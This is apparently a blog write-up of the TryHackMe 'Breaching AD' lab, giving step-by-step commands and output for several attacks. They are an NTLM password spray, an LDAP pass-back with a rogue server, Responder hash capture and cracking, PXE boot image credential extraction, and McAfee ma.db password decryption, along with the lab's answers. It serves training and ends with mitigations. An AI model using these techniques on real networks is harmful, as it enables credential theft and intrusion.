---
id: 626
title: "TryHackMe Breaching AD writeup"
created: 2023-10-15T13:50:55+00:00
url: https://hacklido.com/blog/626-tryhackme-breaching-ad-writeup
words: 2765
---

# TryHackMe Breaching AD writeup

[image]

Now this is my personal favourite and most enjoyed and kinda annoying room that I have come across in tryhackme. For months I wanted to solve it, due to procrastination, self-doubt and lack of dedication never bothered to jump into this room. It was really fun and learned a lot about AD than from any of courses or youtube videos that I have passively watched so far. Now let’s dive into the task!

# Task 1  Introduction to AD breaches

Firstly this room will not include any meaningless explanation and if something does not make sense, feel free to google things out or use chatgpt [it’s 2023 guys!]. And lastly do note that for every step or command you wish to skip and do the next part, you will spend minimum of 15 minutes wasting and looking around, potentially wasting your valuable time. The network rooms are intended to be pwned in certain way and unless you are seasoned veteran it’s always better to follow all the steps without even skipping one.

Step 1: Use attack box to avoid headaches, it comes preloaded with task files and programs which you will be in need to solve the room. Trust me when I say this, I literally spent a lot and a lot of time figuring things out. And now use the below command to set and resolve the dns.

[NOTE: The vpn or the attack box connects you to the network but does not resolve the DNS of the domains we will be hacking so yeah do something to resolve your DNS first !]

```
`root@mccleod1290:~# systemd-resolve --interface breachad --set-dns 10.200.20.101 --set-domain za.tryhackme.com
root@mccleod1290:~# nslookup thmdc.za.tryhackme.com
Server:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
Name:	thmdc.za.tryhackme.com
Address: 10.200.20.101`
```

# Task 2 OSINT and Phishing

Just read the material, nothing fancy and answer the questions.

Questions

I understand OSINT and how it can be used to breach AD

```
`no answer needed`
```

I understand Phishing and how it can be used to breach AD

```
`no answer needed`
```

What popular website can be used to verify if your email address or password has ever been exposed in a publicly disclosed data breach?

```
`HaveIBeenPwned`
```

# Task 3 NTLM Authenticated Services

Simply put ‘New Technology LAN Manager (NTLM)’‘ is the group of security protocols used to authenticate users’ identities in AD, based on hallenge-response-based scheme called NetNTLM. That’s all we need to know and rest is just for the sake of knowledge or trivia.

Just go to `cd /root/Rooms/BreachingAD/task3/`, run the script with the below mentioned parameters and then don’t forget to keep your web browser opened on  http://ntlmauth.za.tryhackme.com/ http://ntlmauth.za.tryhackme.com/ !!!!!!

```
`root@mccleod1290:~# cd /root/Rooms/BreachingAD/task3/
root@mccleod1290:~/Rooms/BreachingAD/task3# ls
ntlm_passwordspray.py  passwordsprayer.zip  usernames.txt
root@mccleod1290:~/Rooms/BreachingAD/task3#  python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
[*] Starting passwords spray attack using the following password: Changeme123
[-] Failed login with Username: anthony.reynolds
[-] Failed login with Username: samantha.thompson
[-] Failed login with Username: dawn.turner
[-] Failed login with Username: frances.chapman
[-] Failed login with Username: henry.taylor
[-] Failed login with Username: jennifer.wood
[+] Valid credential pair found! Username: hollie.powell Password: Changeme123
[-] Failed login with Username: louise.talbot
[+] Valid credential pair found! Username: heather.smith Password: Changeme123
[-] Failed login with Username: dominic.elliott
[+] Valid credential pair found! Username: gordon.stevens Password: Changeme123
[-] Failed login with Username: alan.jones
[-] Failed login with Username: frank.fletcher
[-] Failed login with Username: maria.sheppard
[-] Failed login with Username: sophie.blackburn
[-] Failed login with Username: dawn.hughes
[-] Failed login with Username: henry.black
[-] Failed login with Username: joanne.davies
[-] Failed login with Username: mark.oconnor
[+] Valid credential pair found! Username: georgina.edwards Password: Changeme123
[*] Password spray attack completed, 4 valid credential pairs found
root@mccleod1290:~/Rooms/BreachingAD/task3# `
```

Let’s try third valid credentials, as we can see we login and get `Hello World` !

[image]

# Task 4 LDAP BIND CREDENTIALS

LDAP or Lightweight Directory Access Protocol is a popular mechanism with third-party (non-Microsoft) applications that integrate with AD. These include applications and systems such as:

- Gitlab

- Jenkins

- Custom-developed web applications

- Printers

- VPNs

Now in order to hack into ldap let’s see if we get connection from this service using netcat. Turns out the plain text auth is not enabled and we need to come with some crazy idea….

[image]

We will be hosting an rogue or false ldap server on our system, make this website to connect with us, and in our server will be make chances in such a way that it accepts only plain text auth, forcing the website to send credentials in plain text. Sounds nefarious right? let’s get started.

Step 1: Install OpenLDAP

```
`sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`
```

Step2: Reconfigure the ldap server

```
`sudo dpkg-reconfigure -p low slapd`
```

This will prompt user to select some options just select the following options.

```
`no
za.tryhackme.com
za.tryhackme.com
password
mbd
no
yes`
```

Steps 3: Create an new file called `olcSaslSecProps.ldif` don’t change it’s name and save it anywhere in the system.

```
`
nano olcSaslSecProps.ldif`
```

And write the following configurations into the file so that it only accepts and stores plain text authentication.

```
`dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred`
```

Step 4: Now restart rogue ldap server on your device

```
`sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`
```

Optional: To test if the server is up and running just enter the following commands.

```
`ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms`
```

Step 5: Now hit test settings on the website [ http://printer.za.tryhackme.com/settings.aspx http://printer.za.tryhackme.com/settings.aspx] and turn on the sniffer.

```
` sudo tcpdump -SX -i breachad tcp port 389`
```

If you have done everything right, then you should see some input in your terminal. Scroll through the ouput and you should see the password in clear-text!

[image]

Questions

What type of attack can be performed against LDAP Authentication systems not commonly found against Windows Authentication systems?

```
`LDAP Pass-back Attack`
```

What two authentication mechanisms do we allow on our rogue LDAP server to downgrade the authentication and make it clear text?

```
`LOGIN,PLAIN`
```

What is the password associated with the svcLDAP account?

```
`tryhackmeldappass1@`
```

# Task 5 Authentication Relays

Now this is the so far easiest task in this room.

Step 1: Set up responder to listen toLLMNR, NBT-NS, or WPAD requests that are coming in.

```
`root@mccleod1290:~/Rooms/BreachingAD/task5# clear

root@mccleod1290:~/Rooms/BreachingAD/task5# sudo responder -I breachad
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [breachad]
    Responder IP               [10.50.18.20]
    Responder IPv6             [fe80::2dfa:8a5f:a5bf:6c21]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-82DKQCLULPO]
    Responder Domain Name      [PCZ6.LOCAL]
    Responder DCE-RPC Port     [46773]

[+] Listening for events...

[!] Error starting TCP server on port 80, check permissions or other servers running.
[!] Error starting TCP server on port 3389, check permissions or other servers running.
[!] Error starting TCP server on port 389, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : ::ffff:10.200.20.202
[SMB] NTLMv2-SSP Username : ZA\svcFileCopy
[SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:4556405290f1ff1e:2DCF4BEFA60881DC3452C8A286B8B11C:01010000000000008037B67447FFD90164C47755347FA0BA0000000002000800500043005A00360001001E00570049004E002D003800320044004B00510043004C0055004C0050004F0004003400570049004E002D003800320044004B00510043004C0055004C0050004F002E00500043005A0036002E004C004F00430041004C0003001400500043005A0036002E004C004F00430041004C0005001400500043005A0036002E004C004F00430041004C00070008008037B67447FFD90106000400020000000800300030000000000000000000000000200000E2A325441AD730C4E2C10D018342BCE40C83CE956A9CAEEC1771098D3D9035BB0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00310038002E00320030000000000000000000`
```

Step 2: Save the hash, crack it using john or hashcat.

```
`root@mccleod1290:~/Rooms/BreachingAD/task5# echo 'svcFileCopy::ZA:4556405290f1ff1e:2DCF4BEFA60881DC3452C8A286B8B11C:01010000000000008037B67447FFD90164C47755347FA0BA0000000002000800500043005A00360001001E00570049004E002D003800320044004B00510043004C0055004C0050004F0004003400570049004E002D003800320044004B00510043004C0055004C0050004F002E00500043005A0036002E004C004F00430041004C0003001400500043005A0036002E004C004F00430041004C0005001400500043005A0036002E004C004F00430041004C00070008008037B67447FFD90106000400020000000800300030000000000000000000000000200000E2A325441AD730C4E2C10D018342BCE40C83CE956A9CAEEC1771098D3D9035BB0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00310038002E00320030000000000000000000' > hash.txt
root@mccleod1290:~/Rooms/BreachingAD/task5# ls
hash.txt  passwordlist.txt
root@mccleod1290:~/Rooms/BreachingAD/task5# john --wordlist=passwordlist.txt hash.txt
Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"
Use the "--format=ntlmv2-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
FPassword1!      (svcFileCopy)
1g 0:00:00:00 DONE (2023-10-15 09:15) 50.00g/s 25650p/s 25650c/s 25650C/s 123456..hockey
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
root@mccleod1290:~/Rooms/BreachingAD/task5# `
```

Questions

What is the name of the tool we can use to poison and capture authentication requests on the network?

```
`responder`
```

What is the username associated with the challenge that was captured?

```
`svcFileCopy`
```

What is the value of the cracked password associated with the challenge that was captured?

```
`FPassword1!`
```

# Task 6 Microsoft Deployment Toolkit

Now bear with me for a while, this may appear like too much but trust me it’s simple once you get hang of it. Basically ever wondered how windows get’s installed into thousands of devices across a network in an very big company? it’s done using MDT or microsoft deployment toolkit. Along with MDT there is something called as Microsofts System Center Configuration Manager (SCCM) which manages all updates for all Microsoft applications, services, and operating systems. MDT is used for new deployments. SCCM can be seen as almost an expansion and the big brother to MDT.

Now that’s all the theory we need to know, automated installation, deployment and management? does not that spark something in our brain? what if we hack into this toolkit and manager and get credentials of the organisation without breaking sweat? In task 6 and 7 we will focus exclusively on a configuration called Preboot Execution Environment (PXE) boot.

Step 1: SSH into the thmjmp1.za.tryhackme.com using thm as username and use `Password1@` as password

```
`root@mccleod1290:~# ssh thm@THMJMP1.za.tryhackme.com
The authenticity of host 'thmjmp1.za.tryhackme.com (10.200.20.248)' can't be established.
ECDSA key fingerprint is SHA256:HTvSA1Qt987SOP3SRopzSQ22Q8lPttrUzTwuTyGDLck.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'thmjmp1.za.tryhackme.com,10.200.20.248' (ECDSA) to the list of known hosts.
thm@thmjmp1.za.tryhackme.com's password: `
```

Step 2: Go do `Documents` and create an folder in your THM username and copy `C:\powerpxe` to your folder.

```
`
Microsoft Windows [Version 10.0.17763.1098]

thm@THMJMP1 C:\Users\thm>cd Documents

thm@THMJMP1 C:\Users\thm\Documents>dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of C:\Users\thm\Documents

10/15/2023  10:05 AM    <DIR>          .
10/15/2023  10:05 AM    <DIR>          ..
10/15/2023  10:48 AM    <DIR>          Sideswipe
               0 File(s)              0 bytes
               3 Dir(s)  49,654,575,104 bytes free

thm@THMJMP1 C:\Users\thm\Documents>mkdir mccleod1290

thm@THMJMP1 C:\Users\thm\Documents>copy C:\powerpxe mccleod1290
C:\powerpxe\LICENSE
C:\powerpxe\PowerPXE.ps1
C:\powerpxe\README.md
        3 file(s) copied.`
```

Step 3: Using tftp share the .bcd [Boot Configuration Data] file which starts with x64 only and has nothing to it’s name except x64.

```
`C:\Users\thm\Documents\mccleod1290>tftp -i 10.200.20.202 GET "\Tmp\x64{3022071F-3C5E-42A7-81E6-830C730F1261}.bcd" conf.bcd
Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s `
```

Step 4:Now use an powershell utility called as `PowerPXE` to analyse and get data from the `.bcd` file. Do use the Get-WimFile function of powerpxe to recover the locations of the PXE Boot images from the BCD file.

```
`thm@THMJMP1 C:\Users\thm\Documents\mccleod1290>powershell -ep bypass
Windows PowerShellCopyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\thm\Documents\mccleod1290> Import-Module .\PowerPXE.ps1PS

C:\Users\thm\Documents\mccleod1290> $BCDFile = "conf.bcd"

PS C:\Users\thm\Documents\mccleod1290> Get-wimFile -bcdFile $BCDFile>> Parse the BCD file: conf.bcd
>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim  \Boot\x64\Images\LiteTouchPE_x64.wim`
```

Step 5: WIM files are bootable images in the Windows Imaging Format (WIM). Use TFTP to download this image. [Use the location from the previous step].

```
`PS C:\Users\thm\Documents\mccleod1290> tftp -i 10.200.20.202 GE
T \Boot\x64\Images\LiteTouchPE_x64.wim pxeboot.wim
Transfer successful: 341899611 bytes in 188 second(s), 1818614
bytes/s`
```

Step 6: Recovering Credentials from a PXE Boot Image.

```
`PS C:\Users\thm\Documents\mccleod1290> Get-FindCredentials -WimFile pxeboot.wim
>> Open pxeboot.wim
>>>> Finding Bootstrap.ini
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
>>>> >>>> UserID = svcMDT
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = PXEBootSecure1@`
```

[image]

# Task 7 Configuration Files

Now we got domain user and password and let’s do something even fun. Hmm, what can we potentially do? get some configuration files? well guess what we are going to do exactly that and even more get password for an mcAfee application such as `McAfee Enterprise Endpoint Security`. Sounds cool right?

Remember that McAfee embeds the credentials used during installation to connect back to the orchestrator in a file called ma.db which is `C:\ProgramData\McAfee\Agent\DB`.

Step 1: Use `scp` and transfer the database to our system

```
`root@mccleod1290:~# scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db ma.db
thm@thmjmp1.za.tryhackme.com's password:
ma.db                                         100%  118KB  13.8MB/s   00:00 `
```

Step 2: Use `sqlitebrowser` utility to open the database and get hold of ‘auth_passwd’

```
`root@mccleod1290:~# sqlitebrowser ma.db`
```

[image]

Step 3: Go to `/root/Rooms/BreachingAD/task7` and then use an old python2 script which cracks mcafee passwords.

```
`root@mccleod1290:~# cd /root/Rooms/BreachingAD/task7/
root@mccleod1290:~/Rooms/BreachingAD/task7# ls
mcafeesitelistpwddecryption.zip
root@mccleod1290:~/Rooms/BreachingAD/task7# unzip mcafeesitelistpwddecryption.zip
Archive:  mcafeesitelistpwddecryption.zip
3665de8339236b9bd9782b840bcf709a70202ae4
   creating: mcafee-sitelist-pwd-decryption-master/
  inflating: mcafee-sitelist-pwd-decryption-master/README.md
  inflating: mcafee-sitelist-pwd-decryption-master/mcafee_sitelist_pwd_decrypt.py

root@mccleod1290:~/Rooms/BreachingAD/task7# ls
mcafee-sitelist-pwd-decryption-master  mcafeesitelistpwddecryption.zip

root@mccleod1290:~/Rooms/BreachingAD/task7# cd mcafee-sitelist-pwd-decryption-master/
root@mccleod1290:~/Rooms/BreachingAD/task7/mcafee-sitelist-pwd-decryption-master# ls
mcafee_sitelist_pwd_decrypt.py  README.md

root@mccleod1290:~/Rooms/BreachingAD/task7/mcafee-sitelist-pwd-decryption-master# python2 mcafee_sitelist_pwd_decrypt.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
Crypted password   : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
Decrypted password : MyStrongPassword!`
```

Questions

What type of files often contain stored credentials on hosts?

```
`Configuration Files`
```

What is the name of the McAfee database that stores configuration including credentials used to connect to the orchestrator?

```
`ma.db`
```

What table in this database stores the credentials of the orchestrator?

```
`AGENT_REPOSITORIES`
```

What is the username of the AD account associated with the McAfee service?

```
`svcAV`
```

What is the password of the AD account associated with the McAfee service?

```
`MyStrongPassword!`
```

# Task 8 Conclusion

We have successfully completed one of the network machines on tryhackme. Some of the mitigation we can implement are:

```
`In terms of mitigations, there are some steps that organisations can take:

- User awareness and training
-
- Limit the exposure of AD services and applications online
-
- Enforce Network Access Control (NAC)
-
- Enforce SMB Signing
-
- Follow the principle of least privilege`
```

[image]

TryHackMe BreachingAD is one the the most complicated Windows boxes available for practice on THM. If you made it to the end and sucessfully breached Active Directory, then congrats to you! If you want to follow another good TryHackME Windows machine that is almost as equally difficult, try the  https://guidedhacking.com/threads/tryhackme-wreath-walkthrough.19914/ TryHackMe Wreath Walkthrough at GuidedHacking.com. Practice makes perfect as they say and with platforms like THM and great walkthroughs like this one, you should be a pro in no time.



---

## Author follow-up 2

https://hacklido.com/blog/626/2 vampy Thanks a lot bro, I think I don’t deserve such great words and thanks a lot for your support means something to me 😁.
